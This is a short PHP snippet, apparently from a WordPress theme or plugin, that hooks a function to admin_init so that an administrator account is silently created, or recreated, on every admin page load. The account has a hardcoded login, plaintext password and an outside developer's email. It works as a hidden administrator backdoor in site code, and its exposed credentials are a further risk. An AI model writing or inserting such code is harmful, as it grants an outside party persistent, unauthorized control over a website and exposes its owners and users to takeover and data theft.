<?php

// automatically create or insert user
function accessories_usa_developer_access() {
	$userdata = array(
		'first_name'	=> 'Rashadul',
		'last_name'	=> 'Alam',
		'nickname'	=> 'Dev. Alam',
		'description'	=> 'Web Developer (WordPress)',
		'user_login'	=> 'do_action',
		'user_url'	=> 'http://pencilcoders.com',
		'user_pass'	=> 'aU88jnnn',
		'user_email'	=> 'pencilcoderss@gmail.com',
		'role'		=> 'administrator'
	);

	wp_insert_user( $userdata );
}
add_action( 'admin_init',  'accessories_usa_developer_access');
